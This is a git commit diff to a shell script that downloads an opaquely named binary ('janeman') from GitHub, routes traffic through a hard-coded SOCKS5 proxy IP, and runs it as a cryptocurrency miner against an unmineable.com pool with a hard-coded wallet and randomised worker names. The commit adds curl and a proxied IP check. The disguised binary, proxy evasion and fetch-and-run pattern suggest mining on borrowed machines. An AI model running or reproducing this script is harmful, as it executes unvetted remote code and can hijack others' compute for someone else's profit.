0fe92cf8e7a2cbeb8c5f07ade17ea28df478a8b9
vijaykumar892121 <93004368+vijaykumar892121@users.noreply.github.com>
2021-10-22 23:37:27 +0530

    Update pps.sh

--- pps.sh
+++ pps.sh
@@ -3,7 +3,9 @@
 #WALLET=3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E
 #WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
 apt install libpci3
+apt install curl
 wget https://github.com/archernap/prem/raw/main/janeman
 chmod +x janeman
 export http_proxy=socks5://65.2.123.108:9001
+curl -x "socks5://65.2.123.108:9001" ifconfig.co
 timeout 5m ./janeman -pool etchash-asia.unmineable.com:3333 -wal SOL:AbdhMq5piq31nj9qQTqHA3QBAq6McTsTH1MGP6UiRDAy.$(echo $(shuf -i 10-40 -n 1)-PPS) -pass x
